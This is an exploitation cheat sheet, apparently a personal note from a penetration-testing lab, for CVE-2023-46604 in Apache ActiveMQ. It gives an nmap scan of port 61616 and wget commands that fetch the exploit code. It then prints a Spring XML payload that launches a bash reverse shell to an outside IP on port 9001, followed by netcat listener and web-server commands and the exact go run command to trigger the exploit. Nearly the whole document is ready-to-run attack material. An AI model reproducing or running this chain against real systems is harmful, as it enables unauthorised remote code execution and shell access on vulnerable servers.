nmap scan for activeMQ
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sV -oA script_scan ${ip} -p 61616`;

dv.paragraph("```bash\n" + command + "\n```");
```
# CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

https://github.com/rootsecdev/CVE-2023-46604/blob/main/README.md

Requirement files

go.mod
```
wget https://raw.githubusercontent.com/rootsecdev/CVE-2023-46604/refs/heads/main/go.mod
```

main.go
```
wget https://raw.githubusercontent.com/rootsecdev/CVE-2023-46604/refs/heads/main/main.go
```

poc-linux.xml (MANUALLY EDIT IP IN LINE 11)
```
wget https://raw.githubusercontent.com/rootsecdev/CVE-2023-46604/refs/heads/main/poc-linux.xml
```

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <!-- This command will give a reverse shell on port 9001. HTML Entity Encoded. Change IP as needed -->
            <value>bash -i &#x3E;&#x26; /dev/tcp/10.10.16.6/9001 0&#x3E;&#x26;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

---

Open a python webserver

```
python3 -m http.server 9001
```

```
nc -lvnp 4444
```
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";
const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `go run main.go -i ${ip} -p 61616 -u http://${KaliIP}:4444/poc-linux.xml`;

dv.paragraph("```bash\n" + command + "\n```");
```

Reverse connection should be achieved

---

[[4 Shell Upgrade]]

